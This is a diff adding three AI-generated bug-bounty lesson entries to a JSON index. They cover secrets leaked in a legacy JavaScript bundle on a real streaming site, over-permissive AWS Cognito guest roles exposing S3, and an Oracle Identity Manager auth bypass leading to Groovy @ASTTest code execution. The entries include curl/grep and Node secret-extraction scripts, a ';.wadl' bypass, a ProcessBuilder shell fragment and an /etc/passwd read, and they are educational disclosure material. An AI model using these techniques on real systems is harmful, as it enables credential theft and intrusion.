@@ -1,5 +1,127 @@
 [
   {
+    "id": "50379213a558",
+    "title": "How a Forgotten Legacy JS File Landed Me My First Bug Bounty",
+    "url": "https://medium.com/@aekmohop/how-a-forgotten-legacy-js-file-landed-me-my-first-bug-bounty-ee8398a77a1f",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "A. M. Alogo Situmorang"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-28T11:00:23.000Z",
+    "added_at": "2026-10-28T11:35:43.129Z",
+    "categories": [
+      "info-disclosure"
+    ],
+    "severity": "low",
+    "difficulty": "beginner",
+    "summary_en": "An old JavaScript bundle publicly listed in a Google Cloud Storage bucket leaked multiple REACT_APP_ environment variables, including an HMAC secret and API keys. The data came from a legacy build and was not usable to compromise the service, but it shows the danger of leaving sensitive client‑side code exposed.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The Google Cloud Storage bucket had directory listing enabled, allowing anyone to view all files. A legacy JavaScript bundle from an old Smart TV build remained in the bucket. The bundle was built with Create React App, which automatically inlines any environment variable prefixed with REACT_APP_ into the client‑side code. Developers stored sensitive values (HMAC secret, secret key) in a .env file with that prefix, causing them to be baked into the public script. No process was in place to delete old assets, so the vulnerable file stayed accessible.",
+      "walkthrough": "RECON\nStep 1: Identify the static‑asset subdomain used by Vidio.\nCode: https://static.vidio.com\nWhy: The subdomain hosts files for the Smart TV app (subdomain = separate DNS name pointing to storage).\nStep 2: Open the root URL in a browser.\nCode: https://static.vidio.com/\nWhy: The browser shows an XML document because bucket listing is enabled (bucket listing: server returns a list of all objects when no specific file is requested).\n\nDISCOVERY\nStep 3: Look for JavaScript files that contain clues like \"legacy\" or \"old\".\nCode: grep -i \"legacy\" index.xml\nWhy: grep searches text for the word \"legacy\" (grep = command‑line tool to filter lines).\nStep 4: Find the path of the legacy bundle.\nCode: https://static.vidio.com/assets/assets/legacy_bundle.js\nWhy: The URL points to the actual .js file (URL = address of a resource on the web).\n\nEXPLOITATION\nStep 5: Download the bundle to the local machine.\nCode: curl -s \"https://static.vidio.com/assets/assets/legacy_bundle.js\" -o vidio_leaked.js\nWhy: curl performs an HTTP GET request (HTTP request = message from client to server) and saves the response to a file.\nStep 6: Search the file for variables that start with REACT_APP_.\nCode: grep -o 'REACT_APP_[A-Z_]*:\"[^\"]*\"' vidio_leaked.js\nWhy: The regular expression matches strings like REACT_APP_HMAC_SECRET:\"value\" (regex = pattern describing text).\nStep 7: Observe the extracted secrets.\nCode: REACT_APP_HMAC_SECRET:\"V1...\"\nWhy: The value is a hard‑coded secret that was compiled into the client script.\nStep 8: Automate extraction with a Node.js proof‑of‑concept.\nCode: const https = require('https');\nconst VULNERABLE_URL = 'https://static.vidio.com/assets/assets/legacy_bundle.js';\nhttps.get(VULNERABLE_URL, (res) => {\n  let data = '';\n  res.on('data', chunk => data += chunk);\n  res.on('end', () => {\n    const secrets = {\n      'HMAC_SECRET': data.match(/REACT_APP_HMAC_SECRET:\"([^\\\"]+)\"/),\n      'SK': data.match(/REACT_APP_SK:\"([^\\\"]+)\"/),\n      'SK_ID': data.match(/REACT_APP_SK_ID:\"([^\\\"]+)\"/),\n      'MUX_API_KEY': data.match(/REACT_APP_MUX_API_KEY:\"([^\\\"]+)\"/),\n      'SENTRY_DSN': data.match(/REACT_APP_SENTRY_DSN:\"([^\\\"]+)\"/)\n    };\n    for (const [name, match] of Object.entries(secrets)) {\n      if (match) console.log(`${name}: ${match[1]}`);\n    }\n  });\n}).on('error', console.error);\nWhy: The script fetches the file (https.get = makes an HTTP request), concatenates chunks, applies the same regexes, and prints each found secret (console.log = prints to terminal).\n\nREPORTING\nStep 9: Run the script and capture the output.\nCode: node poC.js\nWhy: Shows a reproducible proof of concept (PoC) for the triage team.\nStep 10: Email the findings to security@vidio.com with clear reproduction steps.\nWhy: Responsible disclosure requires a detailed report (email = electronic message).\nStep 11: Receive the vendor response: the file is a legacy artifact, keys are not exploitable, but the report is marked Informational and a bounty is awarded.\nWhy: The security team confirmed the root cause and rewarded the useful finding.",
+      "example": "Assume a fictional site assets.example.com hosts a public Google Cloud bucket. The bucket listing URL https://assets.example.com/ returns an XML list that includes old_bundle.js. The file was built with Create React App and contains:\n\nconst API_URL = \"https://api.example.com\";\nconst REACT_APP_API_KEY = \"abc123def456\";\n\nAn attacker can fetch and search for the key:\n\ncurl -s \"https://assets.example.com/old_bundle.js\" -o old_bundle.js\ngrep -o 'REACT_APP_[A-Z_]*:\"[^\"]*\"' old_bundle.js\n\nOutput:\nREACT_APP_API_KEY:\"abc123def456\"\n\nWhy it works: The bucket is publicly readable, the legacy build embeds the API key because the .env file used REACT_APP_API_KEY, and the attacker can retrieve it with a simple HTTP GET (curl) and pattern search (grep).",
+      "takeaway": "When hunting, always check if a target uses public cloud storage for static assets and verify whether directory listing is enabled. Look for old or backup filenames (legacy, old, dev) because they often contain outdated builds that may expose secrets. Search downloaded JavaScript bundles for REACT_APP_ (or similar) prefixes, as many front‑end frameworks embed any prefixed variable into the client code. Variants of this issue appear with other frameworks (e.g., Angular environment.ts, Vue.js process.env) and with AWS S3 buckets that allow public listing. A common beginner mistake is assuming any secret found in client‑side code can be directly used to compromise the service without confirming its server‑side role.",
+      "fix": "Disable public listing on the storage bucket or make it private, so unauthenticated users cannot enumerate files. Remove all legacy build artifacts from the bucket and implement a cleanup pipeline for old releases. Do not store sensitive values in environment variables that are prefixed for client exposure; keep secrets on the server side and reference them via secure APIs. If a variable must be public (e.g., analytics key), use a non‑secret identifier and rotate it regularly. Example fix for a React project: move HMAC_SECRET out of .env and do not prefix it with REACT_APP_, then access it only on the backend.\n\n// Fixed .env (server‑only)\nHMAC_SECRET=verySecretValue\n// Client‑side .env (no secrets)\nREACT_APP_API_ENDPOINT=https://api.example.com",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Every bug hunter remembers their first valid bounty. Before that first payout, you spend hours staring at terminal screens, second-guessing your recon, and wondering if every finding is just a false positive or a duplicate. In February 2026, I finally broke the seal. It wasn’t a flashy remote code execution (RCE) or a complex account takeover. Instead, it came down to bug bounty basics: **checking an open cloud storage bucket and digging through an old, forgotten JavaScript file.** Here is the story of how I found hardcoded environment variables in Vidio’s Smart TV application, how my “High” s",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 43
+  },
+  {
+    "id": "f8484b95bc50",
+    "title": "I Got Invited to a Private Bug Bounty. The Bug Was Sitting in a JavaScript File.",
+    "url": "https://anubhavdhakal.medium.com/i-got-invited-to-a-private-bug-bounty-the-bug-was-sitting-in-a-javascript-file-096095e17ccf",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Xpl0itZ3r0X"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-28T09:10:53.000Z",
+    "added_at": "2026-10-28T11:36:02.950Z",
+    "categories": [
+      "access-control",
+      "info-disclosure"
+    ],
+    "severity": "high",
+    "difficulty": "beginner",
+    "summary_en": "An AWS Cognito Identity Pool ID found in a public JavaScript file allowed unauthenticated users to obtain temporary AWS credentials with excessive permissions, enabling the listing of private customer documents in an S3 bucket.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The root cause was an overly permissive Identity and Access Management (IAM) policy attached to the 'Unauthenticated' role of an AWS Cognito Identity Pool. Developers often grant broad permissions (like s3:*) to guest roles during development to ensure features like 'sample previews' work, but fail to restrict these permissions to specific file paths or actions before moving to production, effectively granting any internet user access to the entire storage bucket.",
+      "walkthrough": "RECON\n1. Read the program scope document to identify allowed domains and testing boundaries.\n2. Open the target web application in a browser and activate Developer Tools (F12) to monitor network traffic and loaded resources.\n3. Locate the main JavaScript bundle, which is a large file containing the code that runs the website's interactive features.\nDISCOVERY\n4. Search the JavaScript bundle for keywords like 'identityPoolId', 'region', or 'bucket' to find cloud configuration details.\n5. Identify the AWS Cognito Identity Pool ID, a public identifier used to request temporary cloud credentials.\n'us-east-1:xxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'\nWhy: This ID is intended to be public so the app can ask AWS for temporary keys to perform tasks like fetching images.\n6. Formulate a hypothesis: If the app allows guest users to see samples, the 'Unauthenticated' role might have broad permissions.\nEXPLOITATION\n7. Use the Amazon Cognito API to request a unique Identity ID for your current session.\n8. Use that Identity ID to request temporary AWS credentials, including an Access Key, Secret Key, and Session Token.\n9. Configure the AWS CLI (a command-line tool for managing cloud services) with these temporary credentials.\n10. Run the 'get-caller-identity' command to verify the active role and confirm you are acting as a guest.\naws sts get-caller-identity\nWhy: This command returns the Amazon Resource Name (ARN) of the current user; it confirmed the researcher was using the 'Cognito-Unauth-Role'.\nIMPACT\n11. Attempt to list the contents of the application's private S3 bucket (a cloud storage container).\naws s3 ls s3://company-customer-data-bucket/\nWhy: This command asks the cloud to show all files in the bucket. If permissions are restricted, this should fail with 'Access Denied'.\n12. Observe the output showing folders containing sensitive data such as 'invoices/', 'signed-contracts/', and 'id-documents/'.\nWhy: The successful listing proves the guest role has excessive permissions to view the structure of private customer data.",
+      "example": "Imagine a fictional travel app 'target.example' that lets users see 'Top Destinations' without logging in. The app's JavaScript contains an AWS Identity Pool ID. An attacker uses the AWS CLI to get guest credentials and runs 'aws s3 ls s3://target-storage/'. Because the developer attached the 'AmazonS3FullAccess' policy to the guest role instead of just allowing access to the '/public-images/' folder, the attacker can now see (and potentially download) a folder named '/user-passports/'. The vulnerability is not the public ID, but the 'FullAccess' permission given to anyone who uses that ID.",
+      "takeaway": "Always inspect client-side JavaScript for AWS configuration details like Identity Pool IDs or User Pool IDs. While these IDs are not 'secrets' by themselves, they are the gateway to testing the permissions of the associated IAM roles. Use the AWS CLI to 'test the fences' by trying to list buckets, read database tables, or invoke functions. A common variant is finding these IDs in mobile app binaries (.ipa or .apk files). Avoid the mistake of reporting the ID itself as a leak; instead, prove that the ID grants access to data it shouldn't.",
+      "fix": "Apply the Principle of Least Privilege to all IAM roles, especially unauthenticated ones. Instead of granting 's3:*' on an entire bucket, create a policy that only allows 's3:GetObject' on a specific public prefix. For example: { \"Effect\": \"Allow\", \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::my-bucket/public/*\" }. Additionally, use IAM policy variables to ensure authenticated users can only access their own specific folders.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "> **A quick note before we start:** The company, the data and the timeline in this story are changed so nobody can be identified. The bug class is real, it is common, and the way of thinking is exactly how I approach this kind of work. The email came in on a Tuesday night. Subject line: _You’ve been invited to a private program._ If you have never had one, here is what that means. Most bug bounty programs are public. Anyone can sign up and start poking at the target, so the easy bugs are usually gone within days. A private program is different. A company invites a small number of researchers,",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
+    "id": "63a5650f5e5e",
+    "title": "Catatan tentang Penetrasi Keamanan Sistem Oracle Identity Manager di U.S. Environmental Protection Agency | US EPA",
+    "url": "https://medium.com/@rdennisius/catatan-tentang-penetrasi-keamanan-sistem-oracle-identity-manager-di-u-s-c7bfb97e37fe",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "Dennisius Reki"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-28T08:18:52.000Z",
+    "added_at": "2026-10-28T11:36:26.454Z",
+    "categories": [
+      "auth-bypass",
+      "rce"
+    ],
+    "severity": "critical",
+    "difficulty": "advanced",
+    "summary_en": "Attackers bypassed authentication in Oracle Identity Manager using matrix parameters and achieved Remote Code Execution (RCE) by abusing Groovy's @ASTTest annotation during script compilation.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability was caused by a flawed 'SecurityFilter' (a Java component that checks if a user is allowed to see a page) which used a 'regex' (a text-matching pattern) to identify public files. This regex, '\\.[wW][aA][dD][lL](.)*\\z', only checked if the URL ended with '.wadl', failing to account for 'matrix parameters' (extra data added with a semicolon ';'). This allowed an attacker to reach the 'groovyscriptstatus' 'endpoint' (a specific web function) without logging in. Furthermore, this endpoint used a 'compiler' (a tool that translates code) to check script syntax. The compiler supported '@ASTTest', an 'annotation' (a special code tag) that executes logic during the 'compilation phase' (the translation process), allowing code execution even if the script is never officially 'run'.",
+      "walkthrough": "RECON\n1. The researcher identified a protected function used to check Groovy scripts.\nGET /iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus\nWhy: The server returns a '401 Unauthorized' error, meaning an 'authentication' (identity check) is required.\n\nBYPASS\n2. The researcher attempted to bypass the 'SecurityFilter' using a 'matrix parameter' (a way to add data to a URL segment using a semicolon).\nPOST /iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus;.wadl\nWhy: The 'SecurityFilter' sees '.wadl' at the end and thinks it is a public file, while the backend 'router' (the system that directs traffic) ignores the semicolon and sends the request to the protected function.\n\nEXPLOITATION\n3. The researcher crafted a 'payload' (malicious input) using the '@ASTTest' annotation to run code during the 'compilation' (the process of checking the code's structure).\n@ASTTest(phase = CompilePhase.SEMANTIC_ANALYSIS, value = { ... })\nWhy: This tells the Groovy compiler to run the code inside the curly braces immediately while it is still just 'checking' the script for errors.\n4. The researcher used 'Reflection' (a way for a program to inspect and modify its own internal structure) to find the current 'thread' (a single path of execution in a program).\ndef thread = Thread.currentThread()\nWhy: To gain control over the specific process currently handling the attacker's web request.\n5. The researcher accessed the 'HttpServletResponse' (the object the server uses to send data back to the user's browser).\ndef res = handler.getClass().getMethod(\"getServletResponse\").invoke(handler)\nWhy: By grabbing this object, the attacker can force the server to send the results of malicious commands directly back in the web response.\n6. The researcher used 'ProcessBuilder' to execute a system command on the server.\nnew ProcessBuilder(\"/bin/sh\", \"-c\", \"id\")\nWhy: This starts a 'shell' (a command-line interface) on the server to run the 'id' command, which shows the current user's permissions.\n\nIMPACT\n7. The researcher sent the full payload to the bypassed URL.\nPOST /.../groovyscriptstatus;.wadl\nWhy: The server 'compiles' the malicious script, triggers the '@ASTTest' code, executes the system command, and writes the output (e.g., 'uid=4622(oracle)') back to the attacker's screen.",
+      "example": "Imagine a website 'target.example' that lets you 'test' custom CSS styles. When you submit CSS, the server uses a 'parser' (a tool that reads the code) to check for errors. If the parser is 'vulnerable' (has a weakness), an attacker could use a special CSS feature like '@import' combined with a server-side flaw to make the server read private files. For example, the attacker sends: '@import url(\"file:///etc/passwd\");'. If the parser doesn't block local file access, it might include the contents of the server's password file in the 'syntax error' message shown to the attacker. This is similar to the Groovy bug because the 'check' itself becomes the 'attack'.",
+      "takeaway": "Always look for 'syntax checkers', 'compilers', or 'validators' that process complex languages (Groovy, Java, Python, YAML). These tools often have 'side effects' during the parsing stage that can lead to RCE. When hunting for 'authentication bypasses', test how the 'SecurityFilter' handles special characters like semicolons (';'), dots ('.'), or null bytes ('%00'). A common mistake is trusting a 'regex' that only looks at the end of a URL string. A variant of this is 'Path Traversal', where an attacker uses '../' to move between folders on the server.",
+      "fix": "To fix this, the 'SecurityFilter' must 'normalize' (clean and standardize) the URL before checking it against any 'regex' patterns. This ensures that 'matrix parameters' (;) are removed or handled correctly so they cannot hide the true destination. For the Groovy execution, the developers should use a 'SecureASTCustomizer'. This is a security configuration for the Groovy compiler that allows you to 'allowlist' (only permit) safe features and 'blocklist' (forbid) dangerous ones like '@ASTTest'. Example fix: 'SecureASTCustomizer customizer = new SecureASTCustomizer(); customizer.setIndirectImportCheckEnabled(true);' which restricts what the script can do during compilation.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Latar belakang sistem: Oracle Identity Manager (OIM) dilindungi oleh komponen yang disebut OWSM (Oracle Web Services Manager). Setiap permintaan yang masuk akan diperiksa oleh SecurityFilter, yaitu sebuah kelas Java yang dikenal dengan nama lengkap oracle.wsm.agent.handler.servlet.SecurityFilter. Berikut cara kerja filter ini: Filter ini memeriksa URI permintaan berdasarkan pola regex: WADL_PATTERN = Pattern.compile(\"\\\\.[wW][aA][dD]lL*\\\\z\"); Regex ini berarti: “apakah URI diakhiri dengan .wadl (tanpa memperhatikan huruf besar atau kecil), diikuti oleh karakter apa pun?” Logika yang keliru: Jik",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
     "id": "bbfd0029ce13",
     "title": "From P4 to P1 — Day 5: Open Redirect Vulnerabilities in Bug Bounty Hunting",
     "url": "https://medium.com/@cyb3rD1vvya/from-p4-to-p1-day-5-open-redirect-vulnerabilities-in-bug-bounty-hunting-396b9bb7d8b5",
